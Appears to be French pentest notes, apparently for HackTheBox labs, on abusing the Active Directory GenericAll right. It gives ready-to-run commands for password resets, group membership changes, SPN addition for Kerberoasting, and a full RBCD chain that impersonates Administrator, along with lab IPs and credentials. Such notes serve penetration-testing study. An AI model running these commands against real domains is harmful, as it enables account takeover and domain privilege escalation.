`GenericAll` est le droit le plus puissant qu'on puisse trouver dans une ACL — c'est littéralement le "full control" sur l'objet. Contrairement aux droits précédents qui sont **ciblés** (un seul type d'action possible), `GenericAll` te donne accès à **toutes les techniques vues jusqu'ici en même temps**, au choix.

## Le concept

`GenericAll` = contrôle total sur l'objet AD : tu peux lire tous les attributs, en écrire n'importe lequel, modifier l'ACL, changer le mot de passe, etc. C'est l'équivalent object-level d'être admin sur cet objet précis (pas sur tout le domaine, juste sur lui).

La particularité de `GenericAll`, c'est que **le type d'objet cible détermine quelle technique utiliser** — l'attaque change complètement selon que la cible est un user, un groupe, un computer, ou un GPO.

## Selon le type d'objet cible

### Cible = User
Le plus simple : reset direct du mot de passe (pas besoin de `ForceChangePassword`, `GenericAll` l'inclut).

**Linux :**
```bash
bloodyAD --host <dc_ip> -d <domain> -u <user> -p '<password>' set password <target_user> '<NewPassword123!>'
```

**Windows :**
```powershell
$cred = ConvertTo-SecureString '<NewPassword123!>' -AsPlainText -Force
Set-ADAccountPassword -Identity '<target_user>' -NewPassword $cred -Reset
```

Ou alternative discrète : ajout de SPN pour Kerberoasting (comme vu précédemment), si tu veux éviter d'écraser le mot de passe.

### Cible = Groupe
Ajout direct comme membre (pas besoin d'AddSelf) :
```bash
bloodyAD --host <dc_ip> -d <domain> -u <user> -p '<password>' add groupMember <target_group> <user>
```

### Cible = Computer (le cas le plus fréquent sur HTB)
Ici la technique classique est le **RBCD** (Resource-Based Constrained Delegation) : tu configures l'attribut `msDS-AllowedToActOnBehalfOfOtherIdentity` pour autoriser un compte que tu contrôles (souvent un compte machine que tu crées) à s'authentifier *au nom de n'importe quel utilisateur* sur cette machine cible.

```bash
# Étape 1 : créer un compte machine (si tu n'en as pas déjà un)
addcomputer.py -computer-name 'EVILPC$' -computer-pass 'Password123!' '<domain>/<user>:<password>'

# Étape 2 : configurer le RBCD
rbcd.py -delegate-from 'EVILPC$' -delegate-to '<target_computer>$' -action write '<domain>/<user>:<password>'

# Étape 3 : demander un ticket S4U2Self/S4U2Proxy en usurpant un admin (ex: Administrator)
getST.py -spn 'cifs/<target_computer>.<domain>' -impersonate Administrator -dc-ip <dc_ip> '<domain>/EVILPC$:Password123!'

# Étape 4 : utiliser le ticket obtenu
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass <target_computer>.<domain>
```

**Windows (PowerView) équivalent :**
```powershell
$sd = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<SID_evilpc>)"
$sdBytes = New-Object byte[] ($sd.BinaryLength)
$sd.GetBinaryForm($sdBytes, 0)
Set-DomainObject -Identity '<target_computer>' -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$sdBytes}
```

### Cible = GPO
Modification de la GPO pour y injecter une tâche planifiée malveillante qui s'exécute sur toutes les machines qui l'appliquent (via `SharpGPOAbuse` côté Windows, plus rare sur Linux).



### Changement de mdp
```bash 
bloodyad -d administrator -u 'Olivia' -p 'ichliebedich' --host 10.129.41.212 set password Michael Password1234*
```

### Ajouter un user dans un groupe
```bash
bloodyad -u <USER> -p <PASS> -d <DOMAIN-NAME> --host <IP-DC> add groupMember 'service accounts' <USER_CIBLE>

[+] p.agila added to service accounts
```

### Ajouter un SPN au compte pour futur Kerberoasting
```bash
# Ajout d'un SPN pour le compte de N.Thompspn  
bloodyad -d delegate.vl  -u 'A.Briggs' -p 'P4ssw0rd1#123' --host 10.129.234.69 set object N.Thompson servicePrincipalName -v 'http:/anything'
```
